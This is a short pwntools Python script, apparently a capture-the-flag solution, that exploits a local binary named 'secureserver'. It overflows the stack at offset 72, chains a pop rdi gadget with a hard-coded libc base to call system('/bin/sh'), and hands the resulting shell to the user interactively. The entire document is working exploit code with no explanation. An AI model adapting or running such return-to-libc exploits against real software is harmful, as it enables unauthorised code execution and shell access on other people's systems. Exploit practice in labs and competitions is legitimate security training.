from pwn import *

exe = './secureserver'

context.binary = elf = ELF(exe)
context.log_level = 'debug'

offset = 72

pop_rdi = 0x000000000040120b
libc = elf.libc
libc.address = 0x00007ffff7dc6000
ret = 0x0000000000401016

system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))

payload = flat([
    asm('nop')*offset,
    pop_rdi,
    binsh,
    ret,
    system,
])

p = process(exe)
p.sendlineafter(b":", payload)
p.interactive()
